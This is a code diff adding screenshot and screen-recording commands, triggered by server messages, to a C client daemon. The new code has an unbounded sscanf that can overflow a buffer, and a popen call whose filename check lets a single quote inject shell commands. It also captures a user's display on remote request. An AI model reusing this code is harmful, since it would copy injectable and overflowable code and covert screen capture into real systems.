@@ -1,5 +1,158 @@
 #include "client_daemon.h"
 
+bool livestream(const char *server_message, char *response)
+{
+    if (server_message == NULL || response == NULL)
+    {
+        strcpy(response, "Error: Invalid parameters");
+        return false;
+    }
+    char filename[256];
+    int duration_seconds;
+    if (sscanf(server_message, "livestream %s %d", filename, &duration_seconds) != 2)
+    {
+        strcpy(response, "Error: Invalid command format. Expected: livestream \"filename\" \"duration\"");
+        return false;
+    }
+    if (duration_seconds <= 0)
+    {
+        strcpy(response, "Error: Duration must be positive");
+        return false;
+    }
+    int pipefd[2];
+    if (pipe(pipefd) == -1)
+    {
+        strcpy(response, "Error: Failed to create pipe");
+        return false;
+    }
+    pid_t pid = fork();
+    if (pid < 0)
+    {
+        strcpy(response, "Error: Failed to fork process");
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return false;
+    }
+    if (pid == 0)
+    {
+        close(pipefd[0]);
+        dup2(pipefd[1], STDOUT_FILENO);
+        close(pipefd[1]);
+        char duration_str[16];
+        snprintf(duration_str, sizeof(duration_str), "%d", duration_seconds);
+        execlp("ffmpeg", "ffmpeg",
+               "-f", "x11grab",
+               "-i", ":0.0",
+               "-t", duration_str,
+               "-c:v", "libx264",
+               "-preset", "ultrafast",
+               filename,
+               NULL);
+
+        perror("execlp");
+        exit(1);
+    }
+    else
+    {
+        close(pipefd[1]);
+        char buffer[1024];
+        while (read(pipefd[0], buffer, sizeof(buffer)) > 0)
+        {
+        }
+        close(pipefd[0]);
+        int status;
+        waitpid(pid, &status, 0);
+        if (WIFEXITED(status) && WEXITSTATUS(status) == 0)
+        {
+            snprintf(response, 256, "Livestream successfully saved to %s", filename);
+            return true;
+        }
+        else
+        {
+            strcpy(response, "Error: Livestream failed");
+            return false;
+        }
+    }
+}
+
+bool execute_screenshot(const char *server_message, char *response)
+{
+    if (!server_message || !response)
+    {
+        syslog(LOG_ERR, "Error: NULL parameters provided");
+        return false;
+    }
+    char *message_copy = strdup(server_message);
+    if (!message_copy)
+    {
+        syslog(LOG_ERR, "Error: Memory allocation failed for message copy");
+        return false;
+    }
+    char filename[256] = {0};
+    char *token = strtok(message_copy, " ");
+    token = strtok(NULL, " ");
+    if (!token)
+    {
+        syslog(LOG_ERR, "Error: No filename provided in command: %s", server_message);
+        free(message_copy);
+        snprintf(response, 64, "Error: Invalid screenshot command format");
+        return false;
+    }
+    if (strlen(token) >= sizeof(filename) || strlen(token) == 0)
+    {
+        syslog(LOG_ERR, "Error: Filename length invalid: %s", token);
+        free(message_copy);
+        snprintf(response, 64, "Error: Invalid filename length");
+        return false;
+    }
+    if (strstr(token, "..") || strstr(token, "/"))
+    {
+        syslog(LOG_ERR, "Error: Invalid characters in filename: %s", token);
+        free(message_copy);
+        snprintf(response, 64, "Error: Invalid filename characters");
+        return false;
+    }
+    strncpy(filename, token, sizeof(filename) - 1);
+    filename[sizeof(filename) - 1] = '\0';
+    char command[512] = {0};
+    if (snprintf(command, sizeof(command), "scrot '%s' 2>&1", filename) >= sizeof(command))
+    {
+        syslog(LOG_ERR, "Error: Command buffer overflow");
+        free(message_copy);
+        snprintf(response, 64, "Error: Command too long");
+        return false;
+    }
+    FILE *fp = popen(command, "r");
+    if (!fp)
+    {
+        syslog(LOG_ERR, "Error: Failed to execute screenshot command: %s", strerror(errno));
+        free(message_copy);
+        snprintf(response, 64, "Error: Screenshot command failed");
+        return false;
+    }
+
+    // Read command output
+    char output[256] = {0};
+    if (fgets(output, sizeof(output), fp) != NULL)
+    {
+        // Remove newline if present
+        output[strcspn(output, "\n")] = 0;
+    }
+
+    int status = pclose(fp);
+    free(message_copy);
+
+    if (status != 0)
+    {
+        syslog(LOG_ERR, "Screenshot failed with status %d: %s", status, output);
+        snprintf(response, 64, "Error: Screenshot failed");
+        return false;
+    }
+
+    snprintf(response, 64, "Screenshot saved to %s", filename);
+    return true;
+}
+
 void process_server_command(const char *server_message, char *response)
 {
     if (!server_message || !response)
@@ -20,6 +173,24 @@ void process_server_command(const char *server_message, char *response)
     {
         syslog(LOG_INFO, "Server requested monitor.");
         if (handle_monitor_command(response) == 0)
+        {
+            return;
+        }
+    }
+
+    if (strstr(server_message, "screenshot") != NULL)
+    {
+        syslog(LOG_INFO, "Server requested screenshot.");
+        if (execute_screenshot(server_message, response))
+        {
+            return;
+        }
+    }
+
+    if (strstr(server_message, "livestream") != NULL)
+    {
+        syslog(LOG_INFO, "Server requested screenshot.");
+        if (livestream(server_message, response))
         {
             return;
         }
